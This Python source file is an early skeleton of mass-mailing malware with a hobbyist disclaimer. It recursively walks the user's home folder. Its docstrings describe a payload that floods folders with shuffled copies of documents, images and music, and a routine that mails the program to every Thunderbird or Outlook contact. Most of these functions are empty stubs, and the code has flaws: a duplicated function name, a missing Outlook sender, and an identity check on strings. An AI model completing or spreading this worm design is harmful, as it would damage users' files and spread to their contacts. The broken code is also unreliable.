#!/usr/bin/python

"""
filewriter.py

(c) 2022 telekobold <mail@telekobold.de>

This program was written solely for the joy of exploring how things work
and the intension of sharing accumulated experiences with others. Please
do not abuse it to cause any harm!
"""


# --------------------------------------------------------------------------
# ------------------------------- imports ----------------------------------
# --------------------------------------------------------------------------

from os import listdir
from os.path import expanduser, islink, isdir, isfile
import mimetypes



# --------------------------------------------------------------------------
# -------------------- global variables and constants ----------------------
# --------------------------------------------------------------------------

FILES_TO_WRITE_PER_DIR = 10




# --------------------------------------------------------------------------
# ----------------------- payload helper functions -------------------------
# --------------------------------------------------------------------------

def users_home_dir():
    """
    :returns: the user's home directory on both Unix and Windows platforms
    """
    # return expanduser("~")
    return "/home/telekobold/TestVerzeichnis/OwnCloud-Test-Kopie" # For testing purposes


def is_file_type(file, filetype):
    """
    :file:     a relative or absolute file path
    :filetype: one of the file types "doc", "docx", "jpeg", "jpg", "mp3", "mp4",
               "odt", "ogg", "png", "txt", "wav"
    :returns: `True` if the passed `file` is of the specified file type, false otherwise
    """
    mime_types = {"docx" : "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
                  "jpeg" : "image/jpeg", 
                  "jpg" : "image/jpeg", 
                  "mp3" : "audio/mpeg", 
                  "mp4" : "video/mp4",
                  "odt" : "application/vnd.oasis.opendocument.text", 
                  "ogg" : "audio/ogg", 
                  "png" : "image/png", 
                  "txt" : "text/plain", 
                  "wav" : "audio/x-wav"}
    if file.endswith(filetype):
        return True
    # TODO: mimetypes.guess_type only guesses the MIME type using the file name extension.
    # Provide function which determines the MIME type without having 
    # the file name extension instead (otherwise, this check doesn't make much sense).
    elif mimetypes.guess_type(file)[0] is mime_types[filetype]:
        return True
    return False


# TODO: Ensure that the function does not simply terminate in the event 
# of an access or write error (e.g. if access rights are missing).
def traverse_dirs(curr_file):
    """
    Recursively traverses all directories and subdirectories
    starting from `curr_file` and calls the appropriate 
    processing function for each file.
    """
    if islink(curr_file):
        print("detected symlink {}".format(curr_file))
        # TODO: Maybe do the same as for directories instead of just ignoring symlinks?
        return
    if isfile(curr_file):
        if is_file_type(curr_file, "txt"):
            print("TEXT file {}".format(curr_file))
            process_text_file(curr_file)
        elif is_file_type(curr_file, "docx"):
            print("DOCX file {}".format(curr_file))
            process_docx_file(curr_file)
        elif is_file_type(curr_file, "odt"):
            print("ODT file {}".format(curr_file))
            process_odt_file(curr_file)
        elif is_file_type(curr_file, "jpeg") or is_file_type(curr_file, "jpg") or is_file_type(curr_file, "png"):
            print("image file {}".format(curr_file))
            process_image_file(curr_file)
        elif is_file_type(curr_file, "mp3") or is_file_type(curr_file, "ogg"):
            print("music file {}".format(curr_file))
            process_music_file(curr_file)
    if isdir(curr_file):
        print("DIR {}".format(curr_file))
        for file in listdir(curr_file):
            # TODO: Adapt for Windows ("\" instead of "/").
            traverse_dirs("{}/{}".format(curr_file, file))
    
    
def process_text_file(file):
    """
    Produces FILES_TO_WRITE_PER_DIR new text files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    pass


def process_docx_file(file):
    """
    Produces FILES_TO_WRITE_PER_DIR new docx files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    pass


def process_odt_file(file):
    """
    Produces FILES_TO_WRITE_PER_DIR new odt files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    pass

    
def process_image_file(file):
    """
    Tries to recognize content from file name and loads similar pictures 
    from the internet using a startpage search.
    """
    pass


def process_music_file(file):
    """
    Tries to recognize content from file name and metadata and loads similar
    music from the internet using a startpage search.
    """
    pass



# --------------------------------------------------------------------------
# ---------------------- send mail helper functions ------------------------
# --------------------------------------------------------------------------

    
def read_mails_thunderbird():
    pass

def send_mails_thunderbird():
    pass

def read_mails_outlook():
    pass

def send_mails_thunderbird():
    pass



# --------------------------------------------------------------------------
# -------------------------- main functionality ----------------------------
# --------------------------------------------------------------------------

"""
Search all directories and subdirectoris beginning with the passed dir, 
read all files of every browsed directory,
and create FILES_TO_WRITE_PER_DIR new files for every read file
where each file has a randomly generated filename based on the filename of the read file
and containing the content of the read file, but with the words randomly shuffled.
"""
def payload():
    print("Started browsing dirs...") # test output
    traverse_dirs(users_home_dir())
    print("Finished browsing dirs!") # test output

    
"""
Send this program to all email addresses in the address book of the installed Thunderbird or Outlook.
"""
def send_mail():
    pass
    # If Mozilla Thunderbird is installed, read the whole address book from Thunderbird (SQLite database) and send this program to each address of the address book
    # If Outlook is installed, do the same for Outlook. This check only needs to be done if the operating system is Windows.


if __name__ == "__main__":
    payload()
    send_mail()
